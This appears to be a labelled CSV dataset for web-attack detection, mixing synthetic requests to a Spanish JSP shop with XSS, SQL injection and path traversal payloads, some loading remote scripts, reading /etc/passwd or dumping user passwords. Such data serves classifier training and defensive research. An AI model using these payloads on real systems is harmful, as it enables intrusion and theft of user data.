"<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",xss,0.383958744
"s,{s: select * from users where id=1 or "",{"" or 1=1 -- 1",sqli,0.276741619
"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",xss,0.794469952
imagenes/3.gif,normal,0.04196884
%252e%252e/%252e%252e/%252e%252e/{FILE},traversal,0.886606978
imagenes/cmenbul.gif,normal,0.024062745
"sUE(): select * from users where id='1' union select (\),@@VERSION -- 1'",sqli,0.878939118
imagenes/2.gif,normal,0.293846356
!,sqli,0.577384386
publico/autenticar.jsp?modo=entrar&login=centeno&pwd=b%FAho&remember=off&B1=Entrar,normal,0.566197986
miembros/salir.jsp,normal,0.175919717
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss,0.624360809
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},traversal,0.977241645
miembros/imagenes/castro.jpg,normal,0.457559538
..\{FILE},traversal,0.927559552
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",xss,0.896836408
miembros/imagenes/castro.jpg,normal,0.333748661
imagenes/nuestratierra.jpg,normal,0.831693319
"'""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",xss,0.74585022
miembros/index.jsp,normal,0.146661013
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=90&B1=A%F1adir+al+carrito,normal,0.872249886
"s.;s: select * from users where id=1 or "".;"" or 1=1 -- 1",sqli,0.735963787
miembros/editar.jsp?modo=registro&login=mag8&password=d6ntrotr566&nombre=Tubal&apellidos=Arbel%E1ez+Grippo&email=barnett%40micaelagriga.mw&dni=55585768N&direccion=Pasaje+Alcobendas+S%2FN%2C+&ciudad=Alborea&cp=25152&provincia=Guadalajara&ntc=5181004596461757&B1=Registrar,normal,0.952657696
miembros/index.jsp,normal,0.248182179
replace,sqli,0.073116229
global/menum.jsp,normal,0.398388596
imagenes/1.gif,normal,0.155350736
..%2f{FILE},traversal,0.974959404
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},traversal,0.308233715
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.271164189
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=61&B1=A%F1adir+al+carrito,normal,0.553367735
global/creditos.jsp,normal,0.387433192
imagenes/3.gif,normal,0.651475814
..\\\..\\\..\\\..\\\..\\\{FILE},traversal,0.099291202
miembros/imagenes/zarauz.jpg,normal,0.087749512
global/menum.jsp,normal,0.84385586
publico/productos.jsp,normal,0.355488331
"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",xss,0.046160734
publico/registro.jsp?modo=registro&login=gran25&password=TodITo&nombre=Ranen&apellidos=Galdo+Palac%EDn&email=marysia-paramor%40programaciones.com.mg&dni=75834762J&direccion=C%2F+San+Miguel%2C+111+6%3FF&ciudad=Valencia+de+Don+Juan&cp=15171&provincia=Burgos&ntc=1041858100277526&B1=Registrar,normal,0.814926373
"<img\x47src=x onerror=""javascript:alert(1)"">",xss,0.219894991
miembros/editar.jsp?modo=registro&login=tahsin&password=desempulgadura&nombre=Angilberto&apellidos=Urruch%F9a+Comallonga&email=monkman%40encuentrodominios.org&dni=45054784S&direccion=Paseo+Canteras+75+&ciudad=Cartaya&cp=05198&provincia=Vizcaya&ntc=3616118295208716&B1=Registrar,normal,0.560787447
.../.../.../.../.../{FILE},traversal,0.157384369
miembros/imagenes/zarauz.jpg,normal,0.967405734
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.394236306
publico/productos.jsp,normal,0.818280018
global/menum.jsp,normal,0.884488375
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss,0.763409841
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal,8.94343E-06
publico/autenticar.jsp?modo=entrar&login=ashla&pwd=cEaJO&remember=off&B1=Entrar,normal,0.199625667
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",xss,0.267360778
<body/onload=&lt;!--&gt;&#10alert(1)>,xss,0.699228344
miembros/imagenes/ogono.jpg,normal,0.60622758
&#060,xss,0.577763837
imagenes/cmenbul.gif,normal,0.87156427
%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal,0.715376665
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal,0.097609061
publico/miembros.jsp,normal,0.238151293
imagenes/1.gif,normal,0.691927626
"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",xss,0.059678677
miembros/index.jsp,normal,0.689490512
miembros/fotos.jsp,normal,0.437505182
global/estilos.css,normal,0.859166072
imagenes/3.gif,normal,0.278002618
"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",xss,0.547847248
publico/caracteristicas.jsp?id=2,normal,0.721159254
miembros/salir.jsp,normal,0.272846827
publico/registro.jsp?modo=registro&login=mallorie&password=ha6agar&nombre=Vinicio&apellidos=Espinoza+Blancarte&email=fischetti.bacall%40players.com.gr&dni=66376502C&direccion=Germanies+18%2C+&ciudad=Itrabo&cp=46660&provincia=Asturias&ntc=2812685253359971&B1=Registrar,normal,0.215240355
"sUEo,: select * from users where id='1' union select +\,@@VERSION -- 1'",sqli,0.503148429
imagenes/nuestratierra.jpg,normal,0.056347666
imagenes/1.gif,normal,0.465596687
&#x3c,xss,0.266915856
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.798326538
imagenes/cmenbul.gif,normal,0.783649841
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.961810066
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss,0.77756172
miembros/imagenes/castro.jpg,normal,0.731718086
publico/carrito.jsp,normal,0.792075744
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.505528394
publico/pagar.jsp?modo=insertar&precio=911&B1=Confirmar,normal,0.792315006
"<div STYLE=""background-image: url(javascript:document.vulnerable=true;)"">",xss,0.486400535
%uff0e%uff0e%u2215{FILE},traversal,0.45501088
miembros/salir.jsp,normal,0.918140996
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=34&B1=A%F1adir+al+carrito,normal,0.367107155
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",xss,0.333588893
miembros/imagenes/ogono.jpg,normal,0.57268509
%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},traversal,0.672873473
miembros/salir.jsp,normal,0.491393546
publico/caracteristicas.jsp?id=1,normal,0.358252261
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",sqli,0.787952094
imagenes/cmenbul.gif,normal,0.157267985
imagenes/1.gif,normal,0.508897339
"<script src=""/\%(jscript)s""></script>",xss,0.723198785
miembros/imagenes/castro.jpg,normal,0.311999657
"<script/src=data:,alert()>",xss,0.739393421
"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",xss,0.924053971
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=9&B1=A%F1adir+al+carrito,normal,0.775346466
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.812766426
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal,0.88330851
global/menum.jsp,normal,0.506369183
"&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;",xss,0.693165319
imagenes/logo.gif,normal,0.709019329
<w contenteditable id=x onfocus=alert()>,xss,0.863461484
publico/caracteristicas.jsp?id=2,normal,0.307072851
publico/productos.jsp,normal,0.094915595
publico/productos.jsp,normal,0.271557219
"snv: select * from users where id=1 or ""$@"" or 1=1 -- 1",sqli,0.201646241
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss,0.034955406
"so;s: select * from users where id=1 or ""%;"" or 1=1 -- 1",sqli,0.680807017
publico/autenticar.jsp?modo=entrar&login=valentik&pwd=ba46ea5&remember=on&B1=Entrar,normal,0.847546394
"1oUE1: select * from users where id=1 -1<@ union select 1,version() -- 1",sqli,0.377392555
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal,0.135953686
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.23893944
publico/miembros.jsp,normal,0.309770595
..%255c..%255c..%255c{FILE},traversal,0.585328511
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.670161366
%2e%2e/%2e%2e/{FILE},traversal,0.149660498
"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",xss,0.648092408
index.jsp,normal,0.212849679
../../../../etc/passwd,traversal,0.352278596
imagenes/2.gif,normal,0.176909589
imagenes/2.gif,normal,0.491893174
publico/caracteristicas.jsp?id=2,normal,0.416026737
"s;.s: select * from users where id=1 or "";.""=1 or 1=1 -- 1",sqli,0.588767484
"s;v: select * from users where id=1 or "";@"" or 1=1 -- 1",sqli,0.865019507
'></select><script>alert(123)</script>,xss,0.437906587
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal,0.139670275
miembros/imagenes/castro.jpg,normal,0.098524439
"<img src\x10=x onerror=""javascript:alert(1)"">",xss,0.205066549
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../{FILE},traversal,0.477406806
"'>""><script src = 'http://www.site.com/XSS.js'></script>",xss,0.671243546
"<img src=x onerror=\x12""javascript:alert(1)"">",xss,0.765513429
global/titulo.jsp,normal,0.402724594
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss,0.041245305
miembros/editar.jsp?modo=registro&login=chao-pin2&password=rabassa&nombre=Graciliano&apellidos=Ishida+Lasalle&email=dresdel.holmer%40xavipetit.um&dni=81568460H&direccion=Calle+Poador%2C+65+3A&ciudad=Fregeneda%2C+La&cp=47150&provincia=Valencia&ntc=3748443978921311&B1=Registrar,normal,0.750061332
miembros/index.jsp,normal,0.820132379
global/menum.jsp,normal,0.768062166
publico/pagar.jsp?modo=insertar&precio=2633&B1=Confirmar,normal,0.798626997
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=0&B1=A%F1adir+al+carrito,normal,0.075414257
publico/registro.jsp?modo=registro&login=mollerus&password=1capa2ad*or&nombre=Jorgelina&apellidos=Romanov+Xandri&email=bonyadi-pedro%40programa-gestion-erp.bv&dni=20914276P&direccion=Masia+Can+Giro%2C+5+&ciudad=Puente+del+Congosto&cp=33776&provincia=Lleida&ntc=0332806980099354&B1=Registrar,normal,0.178776125
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss,0.122566399
"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",xss,0.352497148
"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",xss,0.664736209
miembros/imagenes/zarauz.jpg,normal,0.579823445
imagenes/nuestratierra.jpg,normal,0.353627449
' or 'text' = n'text',sqli,0.567709478
miembros/imagenes/castro.jpg,normal,0.395172571
1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1,sqli,0.178533822
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss,0.268215394
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal,0.477503788
"""`'><script>\x0Ajavascript:alert(1)</script>",xss,0.118440943
global/estilos.css,normal,0.995327187
imagenes/nuestratierra.jpg,normal,0.271819116
publico/autenticar.jsp?modo=entrar&login=shuster&pwd=suti8me9te&remember=off&B1=Entrar,normal,0.031049377
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss,0.932919194
global/creditos.jsp,normal,0.406591758
"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",xss,0.002759965
global/estilos.css,normal,0.796926393
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal,0.245473511
global/titulo.jsp,normal,0.179516016
"<img src=""javascript:alert(1)"">",xss,0.49205278
miembros/imagenes/zarauz.jpg,normal,0.65150556
miembros/imagenes/castro.jpg,normal,0.473208816
miembros/imagenes/ogono.jpg,normal,0.878921845
"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",xss,0.829316892
"s;{s: select * from users where id=1 or "";{"" or 1=1 -- 1",sqli,0.289687293
%20$(sleep%2050),sqli,0.617889124
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",xss,0.54571118
publico/pagar.jsp?modo=insertar&precio=7173&B1=Confirmar,normal,0.029308515
%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal,0.206115582
"<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",xss,0.692415998
miembros/imagenes/zarauz.jpg,normal,0.346249638
miembros/imagenes/zarauz.jpg,normal,0.955793166
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",xss,0.245207422
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.756311722
imagenes/logo.gif,normal,0.454994405
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,xss,0.318833927
"vo.UE: select * from users where id=1 + @<@. union select 1,version() -- 1",sqli,0.893547432
global/menum.jsp,normal,0.496191254
"""`'><script>\x21javascript:alert(1)</script>",xss,0.733017986
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal,0.648993264
..%5c..%5c..%5c{FILE},traversal,0.694366375
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.671668203
global/menum.jsp,normal,0.457079228
imagenes/2.gif,normal,0.709145063
%252e%252e\%252e%252e\%252e%252e\{FILE},traversal,0.283664738
"admin"") or (""1""=""1",sqli,0.910193743
publico/pagar.jsp?modo=insertar&precio=7548&B1=Confirmar,normal,0.648051849
imagenes/nuestratierra.jpg,normal,0.151631457
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.992653459
imagenes/3.gif,normal,0.399852437
miembros/fotos.jsp,normal,0.518495911
(sqlvuln),sqli,0.549436228
%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},traversal,0.164589904
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss,0.505186514
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.523855781
miembros/fotos.jsp,normal,0.161380605
global/creditos.jsp,normal,0.12483666
'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,sqli,0.40835496
"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",xss,0.554545412
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss,0.89622141
"so)s: select * from users where id=1 or ""&)"" or 1=1 -- 1",sqli,0.482765595
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss,0.923505995
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal,0.323711424
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss,0.455549541
..%255c..%255c..%255c..%255c{FILE},traversal,0.487084029
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",xss,0.505539922
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss,0.358805063
<svg><script ?>alert(1),xss,0.801149443
miembros/imagenes/zarauz.jpg,normal,0.063679898
"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.414813592
publico/registro.jsp?modo=registro&login=morten&password=sINCr5Nica&nombre=Solano&apellidos=Mera+Alc%E1cer&email=cambre%40be%F1esmer.na&dni=99783130E&direccion=Calle+Hostieros%2C+24+&ciudad=Brihuega&cp=50700&provincia=Cuenca&ntc=3581640568970302&B1=Registrar,normal,0.758214477
'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ,sqli,0.446435912
miembros/imagenes/ogono.jpg,normal,0.021816458
imagenes/logo.gif,normal,0.295392385
publico/autenticar.jsp?modo=entrar&login=loralie&pwd=Par%C9nESi3&remember=off&B1=Entrar,normal,0.155461292
miembros/editar.jsp?modo=registro&login=tehchi8&password=descerrajado&nombre=Gino&apellidos=Flor%ED+Chino&email=blakley%40asyra.ao&dni=61621455Q&direccion=Primavera%2C+174+&ciudad=Portomar%EDn&cp=24730&provincia=Badajoz&ntc=5655366857246860&B1=Registrar,normal,0.215306843
miembros/imagenes/ogono.jpg,normal,0.109857933
"""^""",sqli,0.113554597
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss,0.761022014
imagenes/cmenbul.gif,normal,0.636592529
global/menum.jsp,normal,0.207142136
imagenes/2.gif,normal,0.263454826
global/estilos.css,normal,0.518041153
<iframe src=%(scriptlet)s <,xss,0.577225376
miembros/editar.jsp?modo=registro&login=jeanhee&password=pl9t1r4&nombre=Ezequ%EDas&apellidos=Loyola&email=levi%40coivoco.gr&dni=69364169X&direccion=Carretera+Ribas+Matama+160%2C+&ciudad=Argelita&cp=29056&provincia=Cantabria&ntc=3120097383483394&B1=Registrar,normal,0.099603665
imagenes/logo.gif,normal,0.720799483
"perl -e ';print "";<;IM SRC=java\0script:alert("";XSS"";)>"";;';>; out",xss,0.426469877
miembros/imagenes/ogono.jpg,normal,0.729755053
"&1UE1: select * from users where id=1 ||1 union select 1,banner from v$version where rownum=1 -- 1",sqli,0.873107469
imagenes/nuestratierra.jpg,normal,0.291778133
' or ''=',sqli,0.155870376
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss,0.560602824
"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss,0.199570853
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal,0.284393188
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal,0.209987632
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.369310225
miembros/imagenes/castro.jpg,normal,0.885842967
imagenes/3.gif,normal,0.042458487
publico/miembros.jsp,normal,0.394862494
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss,0.647259068
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss,0.730073898
"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;XSS&lt;/A&gt;",xss,0.992261545
%252e%252e\{FILE},traversal,0.258758039
miembros/imagenes/ogono.jpg,normal,0.303702449
"1oonU: select * from users where id=1 + \+*$ union select null,@@VERSION -- 1",sqli,0.948080397
"<A HREF=""http://66.102.7.147/"">XSS</A>",xss,0.425747019
*(|(mail=*)),sqli,0.043763064
imagenes/cmenbul.gif,normal,0.359646727
miembros/editar.jsp?modo=registro&login=kelkar&password=.paTEO&nombre=Barcario&apellidos=Rafart+Baquer%F3&email=keep_theberge9%40aprendeaestudiar.gr&dni=54738650F&direccion=Avenida+De+La+Almozara+33%2C+&ciudad=Gallifa&cp=20001&provincia=Guadalajara&ntc=7548017062827268&B1=Registrar,normal,0.489789624
imagenes/nuestratierra.jpg,normal,0.771299076
"<;A HREF="";http://www.gohttp://www.google.com/ogle.com/"";>;XSS<;/A>;",xss,0.953849543
&#X0003C,xss,0.255109486
%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,traversal,0.046542178
"s;UEs: select * from users where id=1 or 1#""; union select 'a',version() -- 1",sqli,0.805778027
imagenes/nuestratierra.jpg,normal,0.226519257
global/menum.jsp,normal,0.093635298
"s,,s: select * from users where id=1 or "",,""=1 or 1=1 -- 1",sqli,0.243229955
8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->,sqli,0.677728037
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,0.433172563
global/estilos.css,normal,0.205477277
publico/autenticar.jsp?modo=entrar&login=krautle&pwd=humANitarI9mo&remember=off&B1=Entrar,normal,0.427799742
"""><img src=x onerror=javascript:alert(""A"")>",xss,0.745929247
or 1=1--,sqli,0.337497835
miembros/imagenes/castro.jpg,normal,0.088398404
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,0.495997183
publico/autenticar.jsp?modo=entrar&login=quinn&pwd=incisivo&remember=off&B1=Entrar,normal,0.303117207
miembros/index.jsp,normal,0.084972098
index.jsp,normal,0.952127802
miembros/editar.jsp?modo=registro&login=jasper&password=lebRILLo&nombre=Vivaldo&apellidos=Geli+Febo&email=tchjan-lian.quadflieg%40comerciosdeaspe.se&dni=85510378N&direccion=Av.+Pablo+Iglesias+106%2C+&ciudad=Almog%EDa&cp=31560&provincia=Badajoz&ntc=7509082311963954&B1=Registrar,normal,0.922104535
